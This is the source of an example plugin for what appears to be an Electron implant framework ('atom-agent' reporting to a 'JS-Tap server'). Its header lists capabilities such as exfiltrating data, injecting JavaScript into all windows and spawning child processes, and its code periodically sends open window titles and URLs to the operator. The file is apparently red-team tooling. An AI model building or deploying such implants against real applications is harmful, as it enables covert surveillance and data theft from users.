// Example Plugin — main.js
// Runs in Electron main process via atom-agent plugin system.
//
// 'plugin' object is provided by the atom-agent with these methods:
//   plugin.sendData(dataType, data)  — exfiltrate data to JS-Tap server
//   plugin.setInterval(fn, ms)       — managed interval (auto-cleared on unload)
//   plugin.setTimeout(fn, ms)        — managed timeout (auto-cleared on unload)
//   plugin.getWindows()              — list tracked windows [{id, url, title}]
//   plugin.executeInRenderer(windowId, code) — run JS in a window, returns Promise
//   plugin.injectRenderer(code)      — inject JS into all current + future windows
//   plugin.settings                  — operator-configured settings from activation
//   plugin.fs, plugin.path, plugin.os, plugin.crypto, plugin.childProcess
//   plugin.http, plugin.https
//   plugin.electron.app, plugin.electron.session, plugin.electron.BrowserWindow

var interval = plugin.settings.scrapeInterval * 1000 || 30000;

plugin.setInterval(function() {
    var windows = plugin.getWindows();
    for (var i = 0; i < windows.length; i++) {
        var win = windows[i];
        plugin.sendData('window_info', {
            title: win.title,
            url: win.url,
            windowId: win.id
        });
    }
}, interval);

// Return a cleanup function (optional). Called when the plugin is unloaded.
return function cleanup() {
    // Any additional cleanup logic goes here.
    // Timers registered via plugin.setInterval/setTimeout are auto-cleared.
};
